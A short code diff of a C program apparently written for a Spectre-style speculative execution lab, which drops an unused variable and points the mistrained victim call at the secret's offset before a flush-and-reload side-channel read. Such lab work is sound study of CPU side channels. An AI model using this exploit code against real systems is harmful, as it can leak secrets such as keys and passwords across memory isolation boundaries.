@@ -109,7 +109,6 @@ int main(int argc, const char**argv){
 
 
   size_t larger_x = (size_t)(secret - (char*)buffer);
-  int i;
   u_int8_t s;
   //Mistraining the branch predictor using valid values for x
   for(int i=0; i<10; i++){
@@ -121,7 +120,7 @@ int main(int argc, const char**argv){
 
   // Restricted access
   // Secret will be loaded due to speculative attack
-  s = victim(offset);
+  s = victim(larger_x);
   array[s*4096 + DELTA] += 88; 
 
   reloadSideChannel(thresh);
